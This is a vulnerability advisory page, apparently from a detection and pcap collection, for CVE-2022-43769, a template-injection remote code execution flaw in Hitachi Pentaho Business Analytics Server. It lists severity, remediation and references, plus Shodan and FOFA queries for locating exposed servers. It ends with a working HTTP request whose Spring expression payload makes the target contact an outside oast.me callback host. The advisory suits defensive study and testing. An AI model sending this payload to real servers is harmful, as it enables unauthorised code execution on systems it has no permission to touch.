---
layout: "post"
cve_id: "CVE-2022-43769"
title: "Hitachi Pentaho Business Analytics Server - Remote Code Execution"
pcap: true
pcap_path: "/pcaps/2022/CVE-2022-43769.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-43769.yaml"
author: "dwbzn"
severity: "high"
impact: "Successful exploitation of this vulnerability could allow an attacker to execute arbitrary code on the affected server.
"
remediation: "Upgrade to 9.4 with Service Pack 9.4.0.1. For version 9.3, recommend updating to Service Pack 9.3.0.2."
reference:
  - "https://support.pentaho.com/hc/en-us/articles/14455561548301--Resolved-Pentaho-BA-Server-Failure-to-Sanitize-Special-Elements-into-a-Different-Plane-Special-Element-Injection-Versions-before-9-4-0-1-and-9-3-0-2-including-8-3-x-Impacted-CVE-2022-43769-"
  - "https://nvd.nist.gov/vuln/detail/CVE-2022-43769"
  - "http://packetstormsecurity.com/files/172296/Pentaho-Business-Server-Authentication-Bypass-SSTI-Code-Execution.html"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 7.2, 'cve-id': 'CVE-2022-43769', 'cwe-id': 'CWE-94,CWE-74', 'epss-score': 0.93976, 'epss-percentile': 0.99879, 'cpe': 'cpe:2.3:a:hitachi:vantara_pentaho_business_analytics_server:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 1, 'vendor': 'hitachi', 'product': 'vantara_pentaho_business_analytics_server', 'shodan-query': 'http.favicon.hash:1749354953', 'fofa-query': 'icon_hash=1749354953'}"
tags:
  - "cve"
  - "cve2022"
  - "packetstorm"
  - "rce"
  - "ssti"
  - "pentaho"
  - "hitachi"
  - "kev"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Hitachi Pentaho Business Analytics Server prior to versions 9.4.0.1 and 9.3.0.2, including 8.3.x, is susceptible to remote code execution via server-side template injection. Certain web services can set property values which contain Spring templates that are interpreted downstream, thereby potentially enabling an attacker to execute malware, obtain sensitive information, modify data, and/or perform unauthorized operations without entering necessary credentials.


## üåê HTTP Request
```nohighlight
GET /pentaho/api/ldap/config/ldapTreeNodeChildren/require.js?url=%23{T(java.net.InetAddress).getByName('d5itdm1le0o20c5m0n6g7d39uca71ukwj.oast.me')}&mgrDn=a&pwd=a HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

